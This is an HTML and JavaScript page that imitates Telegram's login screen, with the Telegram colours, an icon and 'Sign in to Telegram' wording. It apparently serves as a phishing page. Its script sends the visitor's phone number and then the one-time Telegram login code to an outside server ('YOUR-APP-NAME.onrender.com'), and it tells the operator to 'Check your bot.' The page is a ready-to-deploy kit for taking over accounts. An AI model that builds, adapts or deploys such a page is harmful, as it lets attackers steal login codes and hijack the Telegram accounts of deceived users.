<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a0a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 500px; }
        .login-card { background: #0a0a0a; padding: 40px 24px; }
        .logo-container { display: flex; justify-content: center; margin-bottom: 32px; }
        .telegram-icon { width: 80px; height: 80px; background: #27a6e5; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .telegram-icon svg { width: 48px; height: 48px; fill: white; }
        h1 { color: #fff; font-size: 32px; font-weight: 500; margin-bottom: 12px; text-align: center; }
        .subtitle { color: #8e8e93; font-size: 16px; margin-bottom: 32px; text-align: center; }
        .input-group { margin-bottom: 24px; }
        .input-label { color: #8e8e93; font-size: 15px; margin-bottom: 8px; display: block; }
        .phone-input-wrapper { display: flex; align-items: baseline; gap: 8px; border-bottom: 1px solid #2c2c2e; }
        .country-code-display { color: #fff; font-size: 17px; padding: 14px 0; }
        .input-field { width: 100%; padding: 14px 0; background: transparent; border: none; color: #fff; font-size: 17px; outline: none; }
        .input-field::placeholder { color: #3a3a3c; }
        select.input-field { cursor: pointer; }
        .login-btn { width: 100%; padding: 14px; background: #27a6e5; color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 500; cursor: pointer; margin-top: 16px; margin-bottom: 24px; }
        .login-btn:hover { opacity: 0.9; }
        .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .message { margin-top: 16px; padding: 12px; border-radius: 10px; font-size: 14px; text-align: center; display: none; }
        .message.error { background: rgba(255, 69, 58, 0.12); color: #ff453a; display: block; }
        .message.success { background: rgba(48, 209, 88, 0.12); color: #30d158; display: block; }
        .code-input { text-align: center; font-size: 32px; letter-spacing: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Phone Screen -->
        <div id="phoneScreen" class="login-card">
            <div class="logo-container">
                <div class="telegram-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM8 12c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm8 0c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2z"/></svg>
                </div>
            </div>
            <h1>Sign in to Telegram</h1>
            <p class="subtitle">Enter your phone number</p>
            <div class="input-group">
                <label class="input-label">Country</label>
                <select id="countryCode" class="input-field">
                    <option value="+251" selected>🇪🇹 Ethiopia (+251)</option>
                    <option value="+1">🇺🇸 US (+1)</option>
                    <option value="+44">🇬🇧 UK (+44)</option>
                    <option value="+91">🇮🇳 India (+91)</option>
                </select>
            </div>
            <div class="input-group">
                <label class="input-label">Phone Number</label>
                <div class="phone-input-wrapper">
                    <span id="countryCodeDisplay" class="country-code-display">+251</span>
                    <input type="tel" id="phoneNumber" class="input-field" placeholder="Enter your phone number">
                </div>
            </div>
            <button id="sendCodeBtn" class="login-btn">SEND CODE</button>
            <div id="messageContainer" class="message"></div>
        </div>

        <!-- Code Screen -->
        <div id="codeScreen" class="login-card" style="display: none;">
            <div class="logo-container">
                <div class="telegram-icon">
                    <svg viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
                </div>
            </div>
            <h1>Enter Code</h1>
            <p class="subtitle">We sent a code to your Telegram</p>
            <div class="input-group">
                <label class="input-label">Verification Code</label>
                <input type="text" id="verificationCode" class="input-field code-input" placeholder="12345" maxlength="8">
            </div>
            <button id="verifyCodeBtn" class="login-btn">VERIFY & LOGIN</button>
            <button id="backToPhoneBtn" class="login-btn" style="background: transparent; border: 1px solid #2c2c2e; color: #27a6e5; margin-top: 0;">← Back</button>
            <div id="codeMessageContainer" class="message"></div>
        </div>
    </div>

    <script>
        // REPLACE WITH YOUR RENDER URL AFTER DEPLOYMENT
        const API_BASE_URL = 'https://YOUR-APP-NAME.onrender.com';
        
        let phoneCodeHash = null;
        let currentPhone = null;

        function showMessage(el, text, type) {
            el.textContent = text;
            el.className = `message ${type}`;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 5000);
        }

        document.getElementById('countryCode').addEventListener('change', function() {
            document.getElementById('countryCodeDisplay').textContent = this.value;
        });

        document.getElementById('backToPhoneBtn').addEventListener('click', () => {
            document.getElementById('phoneScreen').style.display = 'block';
            document.getElementById('codeScreen').style.display = 'none';
        });

        async function sendCode() {
            const phoneInput = document.getElementById('phoneNumber');
            const msgDiv = document.getElementById('messageContainer');
            let phone = phoneInput.value.trim().replace(/[^\d]/g, '');
            const fullPhone = document.getElementById('countryCodeDisplay').textContent + phone;

            if (!phone) {
                showMessage(msgDiv, 'Enter phone number', 'error');
                return;
            }

            currentPhone = fullPhone;
            const btn = document.getElementById('sendCodeBtn');
            btn.textContent = 'SENDING...';
            btn.disabled = true;

            try {
                const res = await fetch(`${API_BASE_URL}/send-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: fullPhone })
                });
                const data = await res.json();

                if (data.success) {
                    phoneCodeHash = data.phone_code_hash;
                    showMessage(msgDiv, '✓ Code sent to your Telegram!', 'success');
                    setTimeout(() => {
                        document.getElementById('phoneScreen').style.display = 'none';
                        document.getElementById('codeScreen').style.display = 'block';
                        document.getElementById('verificationCode').focus();
                    }, 1500);
                } else {
                    showMessage(msgDiv, data.error, 'error');
                }
            } catch (err) {
                showMessage(msgDiv, 'Network error', 'error');
            } finally {
                btn.textContent = 'SEND CODE';
                btn.disabled = false;
            }
        }

        async function verifyCode() {
            const code = document.getElementById('verificationCode').value.trim();
            const msgDiv = document.getElementById('codeMessageContainer');

            if (!code) {
                showMessage(msgDiv, 'Enter verification code', 'error');
                return;
            }

            const btn = document.getElementById('verifyCodeBtn');
            btn.textContent = 'VERIFYING...';
            btn.disabled = true;

            try {
                const res = await fetch(`${API_BASE_URL}/verify-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone: currentPhone,
                        code: code,
                        phone_code_hash: phoneCodeHash
                    })
                });
                const data = await res.json();

                if (data.success) {
                    showMessage(msgDiv, '✅ Verified! Check your bot.', 'success');
                } else {
                    showMessage(msgDiv, data.error, 'error');
                }
            } catch (err) {
                showMessage(msgDiv, 'Verification failed', 'error');
            } finally {
                btn.textContent = 'VERIFY & LOGIN';
                btn.disabled = false;
            }
        }

        document.getElementById('sendCodeBtn').addEventListener('click', sendCode);
        document.getElementById('verifyCodeBtn').addEventListener('click', verifyCode);
        document.getElementById('phoneNumber').addEventListener('keypress', e => e.key === 'Enter' && sendCode());
        document.getElementById('verificationCode').addEventListener('keypress', e => e.key === 'Enter' && verifyCode());
    </script>
</body>
</html>
